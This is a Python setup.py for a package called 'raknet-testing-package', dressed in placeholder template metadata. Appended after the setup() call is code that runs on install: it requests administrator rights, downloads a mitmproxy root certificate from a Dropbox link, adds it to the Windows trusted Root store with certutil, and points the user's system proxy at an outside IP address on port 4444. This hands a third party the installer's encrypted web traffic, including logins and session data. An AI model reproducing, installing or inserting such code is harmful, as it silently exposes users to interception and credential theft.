from setuptools import setup, find_packages
import os
import sys
import ctypes
import winreg
import ssl
import socket
import subprocess
import urllib.request

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Re-run the script with admin rights
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()


with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setup(
    name="raknet-testing-package",  # The name of your package
    version="0.0.1",
    author="Your Name",
    author_email="your.email@example.com",
    description="A very simple example Python package.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/your-simple-package",
    packages=find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
    install_requires=[
        # List any dependencies your package needs here
        # 'requests',
        # 'numpy',
    ],
)






# --- Your original code below ---

def download_p12_cert(cert_url, save_path="cert.p12"):
    try:
        urllib.request.urlretrieve(cert_url, save_path)
        print(f"Downloaded .p12 certificate to: {save_path}")
        return save_path
    except Exception as e:
        print(f"Failed to download cert: {e}")
        return None

def install_p12_to_user_store():
    command = ['certutil', '-addstore', '-f', 'Root', "downloaded_cert.pem"]

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("Certificate imported successfully.")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print("Failed to import certificate.")
        print(e.stderr)

def download_and_install_p12(cert_url, password=""):
    cert_path = download_p12_cert(cert_url, "downloaded_cert.pem")
    if cert_path and os.path.exists(cert_path):
        install_p12_to_user_store()

def set_user_proxy(enable=True, proxy_server="127.0.0.1:8080"):
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
    
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1 if enable else 0)
            if enable:
                winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, proxy_server)
            print(f"{'Enabled' if enable else 'Disabled'} proxy: {proxy_server if enable else ''}")
        
        ctypes.windll.Wininet.InternetSetOptionW(0, 39, 0, 0)
        ctypes.windll.Wininet.InternetSetOptionW(0, 37, 0, 0)

    except Exception as e:
        print(f"Error updating proxy: {e}")



download_and_install_p12("https://www.dropbox.com/scl/fi/6pwocr2yfcaqztfoxkwqm/mitmproxy-ca-cert.pem?rlkey=irl7718in0yr3pwnhgftcm0sm&st=fnll7kc5&dl=1")
set_user_proxy(True, "196.251.86.48:4444")









































